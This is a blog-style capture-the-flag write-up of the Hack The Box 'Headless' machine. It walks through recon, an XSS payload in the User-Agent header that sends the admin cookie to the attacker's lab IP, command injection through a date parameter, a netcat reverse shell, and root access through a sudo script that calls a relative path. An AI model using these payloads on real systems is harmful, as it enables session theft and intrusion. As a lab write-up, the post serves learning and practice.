---
layout: post
title:  "HTB Headless"
tags: web xss
categories: web xss
---
This is my first CTF writeup! I'm thinking of trying to do these regularly from now on, to both practice my writing skills and extract a bit of extra learning value out of each box I do. I figured that spending some extra time doing writeups would assist in remembering the details of boxes I've pwned.

<img src="/images/26e076db204a74b99390e586d7ebcf8c.webp" alt="headless avatar" style="margin:0 auto;display:block;">


## Box Info
Headless is an Easy difficulty linux machine that features a Python Werkzeug server hosting a website. The website has a support form, which we find is vulnerable to an XXS attack that we can use to steal an admin cookie, which gives us access to a dashboard that is vulnerable to command injection. After getting a shell on the box, we find that the user can run a particular shell script as sudo which doesn't use absolute paths, which we can exploit to get root.

## Recon
We start things off with an nmap scan:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 15:13 AEST
Nmap scan report for 10.10.11.8
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?        
| fingerprint-strings:                                                                                   
|   GetRequest:                                                                                          
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 08 Sep 2024 05:13:54 GMT                                                                                                                                                                         
|     Content-Type: text/html; charset=utf-8                                                             
|     Content-Length: 2799                                                                               
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/   
|     Connection: close                                                                                  
|     <!DOCTYPE html>                                                                                    
|     <html lang="en">                                                                                   
|     <head>                                                                                             
|     <meta charset="UTF-8">                                                                             
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>                                                                  
|     <style>                                                                                            
|     body {                                                                                             
|     font-family: 'Arial', sans-serif;                                                                  
|     background-color: #f7f7f7;                                                                         
|     margin: 0;                                                                                         
|     padding: 0;                                                                                        
|     display: flex;                                                                                     
|     justify-content: center;                                                                           
|     align-items: center;                                                                               
|     height: 100vh;                                                                                     
|     .container {                                                                                       
|     text-align: center;                                                                                
|     background-color: #fff;                                                                            
|     border-radius: 10px;                                                                               
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);                                                       
|   RTSPRequest:                                                                                         
|     <!DOCTYPE HTML>                                                                                    
|     <html lang="en">                                                                                   
|     <head>                                                                                             
|     <meta charset="utf-8">                                                                             
|     <title>Error response</title>                                                                      
|     </head>                                                                                            
|     <body>                                                                                             
|     <h1>Error response</h1>                                                                            
|     <p>Error code: 400</p>                                                                             
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>          
|     </body>                                                                                            
|_    </html>
```
Our nmap scan returns two open ports: `22` for SSH, and `5000`, which nmap doesn't recognize, but based on the information returned we can see that it's a HTTP server running Python Werkzeug 2.2.2.

We run a quick gobuster directory brute force on the website, and find two directories, `/support` and `/dashboard`:
```
└─$ gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
```

## Getting a shell

We visit the site by navigating to `10.10.11.8:5000` in our browser, and are greeted by the following page:


<img src="/images/welcome-page.png" alt="Headless welcome page" style="margin:0 auto;display:block;">


Navigating to the `/dashboard` endpoint displays an unauthorized message, which we probably need an admin cookie for, as we saw the cookie `is_admin` in our nmap results earlier.


<img src="/images/unauthorized.png" alt="Headless welcome page" style="margin:0 auto;display:block;">


Going back to the index page, clicking on the 'For Questions' button takes us to a support form page at the `/support` endpoint, which allows us to contact support with a message. We do a quick test for XSS:


<img src="/images/xss-payload.png" alt="xss payload" style="margin:0 auto;display:block;">


Upon submitting the form, we get the following message back:


<img src="/images/hacking-attempt.png" alt="hacking attempt detected" style="margin:0 auto;display:block;">

It seems our xss attempt was caught by the application, and that a report with our browser information will be sent to the administrators to the investigation.

Well, if they're going to pass on a report that includes our browser information to an admin, perhaps we could put our XSS payload in the User-Agent field of our request, and then have it be viewed be executed by an admin whose cookie we would send back to ourselves. We open up the request in burp, and edit our User-Agent to be the URL encoded XSS payload of `<img src=x onerror=this.src="http://10.10.14.20/?c="+document.cookie>`


<img src="/images/xss-user-agent.png" alt="xss user agent" style="margin:0 auto;display:block;">


We send off the request and start a netcat listener on port 80 with `nc -lvnp 80`. After a short delay, we get the admin cookie:


<img src="/images/xss-success.png" alt="xss user agent" style="margin:0 auto;display:block;">


We put the admin cookie into our browser and try to access the `/dashboard` endpoint, and we're in! 


<img src="/images/dashboard.png" alt="dashboard" style="margin:0 auto;display:block;">


The dashboard allows us to generate a website health report for a particular date. Upon hitting the "Generate Report" button, we get the following message back:


<img src="/images/generate-report.png" alt="report" style="margin:0 auto;display:block;">


Looking at the post request that gets generated in burpsuite, we see that it has a single parameter, `date`. 

It's possible that the server is passing this parameter as a string into a system command in order to run generate the website health report (since this is python it might be something like `os.system`). If that's the case, we might be able to inject our own command after the date value. We test this by appending `; id` to the end of the parameter (`;` being the character used to seperate multiple commands on a single line in bash)


<img src="/images/command-injection-burp.png" alt="command injection output" style="margin:0 auto;display:block;">


Checking the dashboard again, we see our command injection worked!


<img src="/images/command-injection-output.png" alt="command injection output" style="margin:0 auto;display:block;">

Now that we have command injection, we can easily get a reverse shell using `busybox nc` and setting up a netcat listener:

<img src="/images/revshell-burp.png" alt="burpsuite revshell" style="margin:0 auto;display:block;">

On our listener, we catch the shell and upgrade it with `python3 -c 'import pty;pty.spawn("/bin/bash")'`:

<img src="/images/revshell-nc.png" alt="nc revshell received" style="margin:0 auto;display:block;">

## Privesc

Now that we have a shell as user `dvir`, we run `sudo -l` to see if he has any sudo privileges that we could use to get root:


<img src="/images/sudo-l.png" alt="sudo -l" style="margin:0 auto;display:block;">


We see that he can run `/usr/bin/syscheck` as root without a password. We run it to see what it does:


<img src="/images/syscheck.png" alt="syscheck" style="margin:0 auto;display:block;">


The output is fairly simple, and it doesn't seem to need any arguments. We cat the file and see that it's a bash script:


<img src="/images/syscheck-code.png" alt="syscheck code" style="margin:0 auto;display:block;">


The script first checks that the running user is root, and will exit if they aren't. It then prints the last modified time of the `vmlinuz` file, the output of `df -h`, and also the output of `uptime`.

So far, the script has been using full paths for all of the commands it runs. However, we spot a flaw in the last section of the script:
```

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```
This part of the script first uses `pgrep` to look for any process with `initdb.sh` in it. If there is no such process, it prints a short message (which we saw earlier) and then runs `./initdb.sh`. This command uses a relative path, meaning that whatever directory we run the script from will be searched for an `initdb.sh` script to be ran.
We can exploit this by creating an `initdb.sh` file containing a bash reverse shell, and then by running `sudo /usr/bin/syscheck` from the same directory.

We create our reverse shell script:

<img src="/images/new-initdb.png" alt="malicious initdb" style="margin:0 auto;display:block;">

And now we just need to start a netcat listener on port 4444, and then run syscheck once more:

<img src="/images/syscheck-for-root.png" alt="syscheck for root" style="margin:0 auto;display:block;">

The syscheck output hangs, but on our nc listener we get a shell as root!

<img src="/images/root-and-flag.png" alt="nc revshell received" style="margin:0 auto;display:block;">

And that's the box!
